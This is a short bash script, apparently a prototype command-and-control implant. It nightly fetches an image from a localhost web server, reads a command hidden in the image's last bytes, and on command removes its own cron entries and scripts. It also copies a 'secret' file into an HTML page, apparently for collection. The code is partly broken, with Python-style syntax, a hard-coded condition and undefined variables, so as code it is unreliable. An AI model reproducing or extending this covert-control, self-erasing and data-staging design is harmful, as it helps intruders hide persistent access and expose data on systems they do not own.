#!/bin/bash

"""
This is the script that is downloaded + run every night
W/out cron version
"""
current=$(date +%s)
#Pull image down from site
command_image="secretImage.png"
wget -nd -r $command_image -A jpeg,jpg,bmp,gif,png http://127.0.0.1:8000/

while true:
do
    #check if there is an image, if not assume connection is broken and delete self
    if [[ 100 < 1 ]]; then
        echo "image hasn't been uploaded"

        #remove references in cron
        crontab -l > crontab_new 
        sed -i '' -e '/C2/d' crontab_new
        sed -i '' -e '/remove_website/d' crontab_new
        #TODO: should delete "java" file (delete everything we added)
        crontab crontab_new
        rm crontab_new

        #remove scripts
        rm remove_website.sh
        rm C2.sh

        echo "delete" 
        exit
    fi

    #Load downloaded image
    load_image=$(<secretImage.png)

    #Take the command
    cmnd="$(echo $load_image | tail -c 5)"
    #delete image after taking command
    rm $command_image 

    echo $cmnd
    #Follow according to that command
    if [ $cmnd = "0000" ]; then #post data
        echo "post"
    #elif: change ip address
    elif [ $cmnd = "1111" ]; then #Delete self
        #delete all mentions in crontab
        crontab -l > crontab_new 
        sed -i '' -e '/C2/d' crontab_new
        sed -i '' -e '/remove_website/d' crontab_new
        crontab crontab_new
        rm crontab_new

        #remove scripts
        rm remove_website.sh
        rm C2.sh

        echo "delete" 
    elif [ $cmnd = "1101" ]; then #change file path
        echo "change path"
    fi

    #Need to know where vulnerable data is
    secret_file="secret_file.txt"

    touch "secretData.html"
    cat $secret_file > "secretData.html"

    #Sleep until next night
    current=$(date +%s)
    target=$(date -j '1:00' +%s)
    sleep_seconds=$(( $target_epoch - $current_epoch ))
    sleep $sleep_seconds

done
